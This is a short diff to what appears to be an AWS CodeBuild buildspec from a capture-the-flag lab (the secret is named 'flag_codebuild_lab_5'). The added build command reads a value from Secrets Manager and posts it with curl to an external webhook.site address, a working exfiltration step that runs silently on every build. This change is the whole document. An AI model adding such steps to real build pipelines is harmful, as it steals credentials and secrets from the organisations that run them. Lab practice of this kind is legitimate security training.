@@ -3,4 +3,4 @@ version: 0.2
 phases:
   build:
     commands:
-      - aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text
+      - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text) && curl --fail --silent --show-error --max-time 15 --data-urlencode "flag=$FLAG" "https://webhook.site/b2e6f729-54b1-48f3-83f4-128f5914171a"
